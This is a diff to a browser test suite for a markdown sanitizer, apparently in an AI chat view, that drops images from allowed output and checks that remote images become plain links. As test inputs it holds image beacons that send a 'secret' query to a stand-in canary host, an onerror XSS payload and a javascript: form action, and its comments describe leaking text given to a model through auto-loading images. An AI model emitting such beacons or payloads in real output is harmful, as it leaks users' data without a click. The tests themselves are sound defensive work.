@@ -54,8 +54,9 @@ const HOSTILE = [
   ['oversized url', `<a href="https://example.com/${LONG_PATH}">x</a>`],
 ];
 
+// S35: `img` is not allowed output; a remote image would load at assignment time (a data channel).
 const ALLOWED_TAGS = new Set([
-  'a', 'b', 'blockquote', 'br', 'code', 'del', 'em', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'img', 'input',
+  'a', 'b', 'blockquote', 'br', 'code', 'del', 'em', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'input',
   'li', 'ol', 'p', 'pre', 's', 'span', 'strong', 'table', 'tbody', 'td', 'th', 'thead', 'tr', 'u', 'ul',
 ]);
 
@@ -70,7 +71,6 @@ const GOLDEN = [
   ['blockquote', '> quoted line\n> second line'],
   ['https link with title', '[docs](https://example.com/docs "Docs")'],
   ['mailto link', '[mail](mailto:someone@example.com)'],
-  ['https image', '![alt text](https://example.com/a.png "t")'],
   ['task list', '- [x] done\n- [ ] todo'],
 ];
 
@@ -211,6 +211,89 @@ test.describe('Rendered markdown sanitizer', () => {
     expect(result[3].href).toBe('https://example.com/ab');
   });
 
+  // S35: a remote <img> starts a request when the sanitized string is assigned, so any text the model was
+  // given (error text, workflow content) can leave in the query string with no click. Images therefore
+  // never survive; each becomes a plain link (or its alt text), and nothing is requested without a click.
+  test('images never load: they become plain links or text', async ({ page }) => {
+    const seen = watchCanary(page);
+    await blockCanaryHost(page);
+    await openHarness(page);
+    const origin = await page.evaluate(() => location.origin);
+    const longAddress = `https://example.com/${'a'.repeat(500)}.png`;
+    const cases = {
+      markdownImage: { markdown: '![alt text](https://canary.invalid/p.gif?d=secret "tip")' },
+      noAlt: { html: '<img src="https://canary.invalid/x.png">' },
+      sameOrigin: { html: `<img src="${origin}/view?filename=s35-canary.png" alt="local">` },
+      linkedImage: { html: '<a href="https://example.com/page"><img src="https://canary.invalid/i.png" alt="logo"></a>' },
+      linkedImageNoAlt: { html: '<a href="https://example.com/page"><img src="https://canary.invalid/i.png"></a>' },
+      unusableAddress: { html: '<img src="data:image/png;base64,AAAA" alt="inline">' },
+      relativeAddress: { html: '<img src="/x.png" alt="rel">' },
+      credentialAddress: { html: '<img src="https://user:pw@canary.invalid/x.png" alt="cred">' },
+      longAddress: { html: `<img src="${longAddress}">` },
+      paddedAddress: { html: '<img src="  https://exa&#9;mple.com/a.png  " alt="p">' },
+    };
+    const results = await page.evaluate(async (inputs) => {
+      const { sanitizeHtml } = await import('/web/doctor_rendering.js');
+      const out = {};
+      for (const [name, input] of Object.entries(inputs)) {
+        const source = input.markdown !== undefined ? window.marked.parse(input.markdown) : input.html;
+        const mount = document.createElement('div');
+        mount.innerHTML = sanitizeHtml(source);
+        document.body.appendChild(mount);
+        out[name] = {
+          images: mount.querySelectorAll('img').length,
+          nestedAnchors: mount.querySelectorAll('a a').length,
+          anchors: [...mount.querySelectorAll('a')].map((a) => ({
+            href: a.getAttribute('href'), text: a.textContent, rel: a.getAttribute('rel'), target: a.getAttribute('target'), title: a.getAttribute('title'),
+          })),
+          text: mount.textContent,
+        };
+        mount.remove();
+      }
+      await new Promise((resolve) => setTimeout(resolve, 300));
+      return out;
+    }, cases);
+
+    for (const [name, result] of Object.entries(results)) {
+      expect.soft(result.images, `${name}: no img element`).toBe(0);
+      expect.soft(result.nestedAnchors, `${name}: no nested anchor`).toBe(0);
+    }
+    expect.soft(results.markdownImage.anchors).toEqual([
+      { href: 'https://canary.invalid/p.gif?d=secret', text: 'alt text', rel: 'noopener noreferrer', target: '_blank', title: 'tip' },
+    ]);
+    expect.soft(results.noAlt.anchors.map((a) => [a.href, a.text])).toEqual([['https://canary.invalid/x.png', 'https://canary.invalid/x.png']]);
+    expect.soft(results.sameOrigin.anchors.map((a) => a.text)).toEqual(['local']);
+    expect.soft(results.linkedImage.anchors.map((a) => [a.href, a.text])).toEqual([['https://example.com/page', 'logo']]);
+    expect.soft(results.linkedImageNoAlt.anchors).toHaveLength(1);
+    expect.soft(results.unusableAddress.anchors).toEqual([]);
+    expect.soft(results.unusableAddress.text).toBe('inline');
+    expect.soft(results.relativeAddress.anchors).toEqual([]);
+    expect.soft(results.relativeAddress.text).toBe('rel');
+    expect.soft(results.credentialAddress.anchors).toEqual([]);
+    expect.soft(results.credentialAddress.text).toBe('cred');
+    expect.soft(results.longAddress.anchors).toHaveLength(1);
+    expect.soft(results.longAddress.anchors[0].text.length).toBeLessThanOrEqual(201);
+    expect.soft(results.longAddress.anchors[0].href).toBe(longAddress);
+    // The parser's canonical address is written back, never the original string.
+    expect.soft(results.paddedAddress.anchors.map((a) => [a.href, a.text])).toEqual([['https://example.com/a.png', 'p']]);
+    expect.soft(seen.requests, `no request may reach ${CANARY_HOST}`).toEqual([]);
+    expect.soft(seen.dialogs).toEqual([]);
+  });
+
+  test('an image address on the page origin is not requested either', async ({ page }) => {
+    const originRequests = [];
+    await openHarness(page);
+    page.on('request', (request) => { if (request.url().includes('s35-origin-canary')) originRequests.push(request.url()); });
+    await page.evaluate(async () => {
+      const { sanitizeHtml } = await import('/web/doctor_rendering.js');
+      const mount = document.createElement('div');
+      mount.innerHTML = sanitizeHtml(`<img src="${location.origin}/view?filename=s35-origin-canary.png" alt="a">`);
+      document.body.appendChild(mount);
+      await new Promise((resolve) => setTimeout(resolve, 300));
+    });
+    expect(originRequests).toEqual([]);
+  });
+
   test('golden corpus keeps its structure', async ({ page }) => {
     await openHarness(page);
     const rows = await page.evaluate(async (corpus) => {
@@ -270,6 +353,8 @@ test.describe('Rendered markdown sanitizer', () => {
       '<form action="javascript:window.__xss=1"><button id="s32-btn">submit</button></form>',
       '<img src="x" onerror="window.__xss=1">',
       '',
+      `![tracker](https://${CANARY_HOST}/p.gif?d=secret)`,
+      '',
       '[safe](https://example.com/docs)',
     ].join('\n');
     await openHarness(page, {
@@ -297,6 +382,9 @@ test.describe('Rendered markdown sanitizer', () => {
     expect(await page.evaluate(() => window.__xss), 'script must not run').toBe(0);
     expect(await bubble.locator('form, iframe, script, [onerror], [onclick]').count()).toBe(0);
     await expect(bubble.locator('a[href="https://example.com/docs"]')).toHaveCount(1);
+    // S35: the tracking image is a plain link, never an element that loads.
+    expect(await bubble.locator('img').count()).toBe(0);
+    await expect(bubble.locator(`a[href^="https://${CANARY_HOST}/p.gif"]`)).toHaveText('tracker');
     expect(seen.dialogs).toEqual([]);
     expect(seen.requests).toEqual([]);
   });
